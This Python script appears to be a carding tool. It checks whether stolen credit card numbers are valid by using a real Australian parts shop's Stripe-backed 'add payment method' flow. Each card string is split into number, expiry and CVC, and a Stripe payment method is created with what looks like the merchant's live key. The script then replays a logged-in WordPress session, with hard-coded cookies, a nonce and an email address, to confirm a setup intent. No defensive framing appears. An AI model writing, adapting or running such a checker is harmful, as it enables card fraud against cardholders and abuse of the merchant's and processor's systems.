import time
import requests
from fake_useragent import UserAgent
import random
import re
from bs4 import BeautifulSoup
import base64
import asyncio

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvp = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    r = requests.session()
    
    user_agent = UserAgent().random
    
    data = f'type=card&card[number]={n}&card[cvc]={cvp}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=JP&pasted_fields=number&payment_user_agent=stripe.js%2F7b2f7dbc1b%3B+stripe-js-v3%2F7b2f7dbc1b%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmooretruckparts.com.au&time_on_page=30356&client_attribution_metadata[client_session_id]=d5c651c4-109b-41ab-9bfe-4ec557b84c1f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=ad429388-2434-4467-be56-846e9e1e0572dbd96f&muid=201dd5d7-c5da-4761-baa9-a49f8175c8667a4f5c&sid=e5d252cf-7cc4-45e3-80b3-7c762f6b938391c755&key=pk_live_51E8DVkChndEVEIPgg7ic3Q5wLpPCATsMKEMUITiJumFq7tgpF2dL8ZoPI5dDHtjSKZNCcyG5uileis8GPoy6DhZr00BymjyeIo&_stripe_version=2024-06-20'

    response = requests.post('https://api.stripe.com/v1/payment_methods',data=data)
    
    try:
        id = response.json()['id']
    except:
        return response.json()
    
    
    cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fmooretruckparts.com.au%2Fmy-account',
    '_gcl_au': '1.1.90984424.1740668340',
    '_fbp': 'fb.2.1740668340420.449172771952263618',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-02-27%2014%3A29%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fmooretruckparts.com.au%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-02-27%2014%3A29%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fmooretruckparts.com.au%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
    '_gid': 'GA1.3.1341950615.1740668342',
    'mailchimp.cart.current_email': 'xynzop515555@gmail.com',
    'mailchimp.cart.previous_email': 'xynzop515555@gmail.com',
    'mailchimp_user_email': 'xynzop515555%40gmail.com',
    'MCPopupClosed': 'yes',
    'wordpress_logged_in_94c06edde22b7c569238009ed7345ce9': 'xynzop515555%7C1741877968%7CYxAs4rHK5FzSKDobhrhMtjhhyVzzVW0gB8M2wFEa5b2%7Ce2ba084b6afa173901e925b2fa2c5d287634456c33a593f5721e50db182368bc',
    'wfwaf-authcookie-4fc51c3d265d7a3241a956feaaf343ba': '1803%7Cother%7Cread%7C0bcd4f8c5aaaf790126dc4cb4fd98d81888008aed33453dcc9b3ed6001ed076a',
    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmooretruckparts.com.au%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_94VMPRDVES': 'GS1.1.1740668342.1.1.1740668405.0.0.0',
    '_ga': 'GA1.3.1554525288.1740668340',
    '_gat_gtag_UA_74176602_1': '1',
    '_ga_KMMWSN9PBD': 'GS1.1.1740668340.1.1.1740668408.0.0.0',
    '__stripe_mid': '201dd5d7-c5da-4761-baa9-a49f8175c8667a4f5c',
    '__stripe_sid': 'e5d252cf-7cc4-45e3-80b3-7c762f6b938391c755',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://mooretruckparts.com.au',
    'Referer': 'https://mooretruckparts.com.au/my-account/add-payment-method/',
    'User-Agent': user_agent ,
    'X-Requested-With': 'XMLHttpRequest',
}

    params = {
    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
}

    data = {
    'action': 'create_and_confirm_setup_intent',
    'wc-stripe-payment-method': id ,
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': '140468307b',
}

    responsey = requests.post('https://mooretruckparts.com.au/', params=params, cookies=cookies, headers=headers, data=data)
    
    try:
        return responsey.json()
    except:
        return 'pika wikaa chutttt'